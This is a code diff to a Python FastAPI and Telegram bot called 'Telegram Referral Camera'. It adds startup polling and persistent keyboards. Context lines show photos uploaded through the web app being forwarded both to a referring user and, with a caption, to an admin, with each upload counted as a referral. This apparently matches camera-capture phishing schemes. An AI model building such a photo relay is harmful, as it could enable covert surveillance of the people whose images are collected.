@@ -1,8 +1,10 @@
 import os
 import json
+import asyncio
 from pathlib import Path
 from typing import List
 from datetime import datetime, timedelta
+from contextlib import asynccontextmanager
 
 from fastapi import FastAPI, Query, Request, UploadFile, File, Form
 from fastapi.responses import HTMLResponse
@@ -10,7 +12,7 @@ from fastapi.templating import Jinja2Templates
 
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import BufferedInputFile, InputMediaPhoto, Message, ReplyKeyboardMarkup, KeyboardButton
-from aiogram.filters import CommandStart, Command
+from aiogram.filters import CommandStart
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -20,14 +22,26 @@ ADMIN_TELEGRAM_ID = int(os.getenv("ADMIN_TELEGRAM_ID", "600280511"))
 
 USERS_FILE = Path("users.json")
 
-app = FastAPI(title="Telegram Referral Camera")
-templates = Jinja2Templates(directory="templates")
-
 if not BOT_TOKEN:
     raise RuntimeError("BOT_TOKEN is not configured")
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
+
+
+# --- إدارة تشغيل البوت مع FastAPI ---
+
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    # تشغيل استقبال الرسائل للبوت عند بدء السيرفر
+    polling_task = asyncio.create_task(dp.start_polling(bot))
+    yield
+    # إيقاف الاستقبال عند إغلاق السيرفر
+    polling_task.cancel()
+    await bot.session.close()
+
+app = FastAPI(title="Telegram Referral Camera", lifespan=lifespan)
+templates = Jinja2Templates(directory="templates")
 
 
 # --- إدارة بيانات المستخدمين ---
@@ -48,7 +62,6 @@ def save_users(data):
 
 
 def get_stats():
-    """حساب إحصائيات المستخدمين"""
     data = load_users()
     users = data.get("users", {})
     
@@ -82,23 +95,23 @@ def get_stats():
 # --- لوحات الأزرار ---
 
 def get_admin_keyboard():
-    """لوحة أزرار خاصة بالمسؤول فقط"""
     return ReplyKeyboardMarkup(
         keyboard=[
             [KeyboardButton(text="📊 إحصائيات البوت")],
             [KeyboardButton(text="/start")]
         ],
-        resize_keyboard=True
+        resize_keyboard=True,
+        persistent=True  # إبقاء الشريك ثابتاً بجانب حقل الإدخال
     )
 
 
 def get_user_keyboard():
-    """لوحة أزرار للمستخدم العادي"""
     return ReplyKeyboardMarkup(
         keyboard=[
             [KeyboardButton(text="/start")]
         ],
-        resize_keyboard=True
+        resize_keyboard=True,
+        persistent=True
     )
 
 
@@ -114,7 +127,6 @@ async def start_handler(message: Message):
     is_new = user_id_str not in users_data["users"]
 
     if is_new:
-        # إضافة المستخدم الجديد
         users_data["users"][user_id_str] = {
             "name": name,
             "username": username,
@@ -124,7 +136,6 @@ async def start_handler(message: Message):
         users_data["total_users"] = len(users_data["users"])
         save_users(users_data)
 
-        # إشعار المسؤول بمستخدم جديد
         username_text = f"@{username}" if username else "بدون اسم مستخدم"
         admin_notice = (
             "👤 **مستخدم جديد انضم للبوت!**\n\n"
@@ -138,7 +149,6 @@ async def start_handler(message: Message):
         except Exception as e:
             print(f"فشل إرسال الإشعار للمسؤول: {e}")
 
-    # التمييز بين المسؤول والمستخدم العادي في الكيبورد
     if message.from_user.id == ADMIN_TELEGRAM_ID:
         kb = get_admin_keyboard()
         welcome_msg = "أهلاً بك عزيزي المسؤول 👋"
@@ -151,7 +161,6 @@ async def start_handler(message: Message):
 
 @dp.message(F.text == "📊 إحصائيات البوت")
 async def stats_handler(message: Message):
-    # التأكد من أن الطالب هو المسؤول فقط
     if message.from_user.id != ADMIN_TELEGRAM_ID:
         return
 
@@ -229,14 +238,12 @@ async def upload_photo(
 
             admin_caption = caption if idx == 0 else ""
 
-            # ألبوم المستخدم (بدون نص)
             media_group_owner.append(
                 InputMediaPhoto(
                     media=BufferedInputFile(image_bytes, filename=f"photo_{idx}.jpg")
                 )
             )
 
-            # ألبوم المسؤول (مع النص)
             media_group_admin.append(
                 InputMediaPhoto(
                     media=BufferedInputFile(image_bytes, filename=f"photo_{idx}.jpg"),
@@ -252,12 +259,10 @@ async def upload_photo(
         print("ERROR SENDING PHOTOS TO TELEGRAM:", repr(error))
         return {"success": False, "message": "فشل إرسال الصور إلى Telegram."}
 
-    # تحديث عدد الإحالات
     user["referrals"] = user.get("referrals", 0) + 1
     save_users(users_data)
 
     return {"success": True, "message": "تم إرسال الصور بنجاح."}
-
 
 
 # import os
